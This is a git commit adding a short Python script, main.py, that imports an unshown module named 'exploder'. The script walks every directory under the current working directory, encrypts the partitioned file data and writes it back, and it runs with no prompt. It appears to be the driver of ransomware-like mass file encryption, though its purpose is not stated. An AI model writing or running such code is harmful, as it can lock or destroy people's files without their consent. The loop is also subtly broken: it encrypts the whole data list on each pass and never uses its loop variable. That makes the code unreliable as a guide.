a301bbd82e69dc09e018014a61c8029640c54ab1
Arad <142410506+Arad1389mi@users.noreply.github.com>
2023-12-18 18:02:00 +0330

    Add files via upload

---
+++ main.py
@@ -0,0 +1,13 @@
+import os
+from exploder import *
+
+def main(root):
+    dirs = Fdir(root).find_dirs()
+    for i in dirs:
+        file_data = Partition(i).part()
+        for j in file_data:
+            enc_data = KeysEnc().encrypt(file_data)
+            Makefile(enc_data, i.split('\\')[-1], i).make()
+
+
+main(os.getcwd())
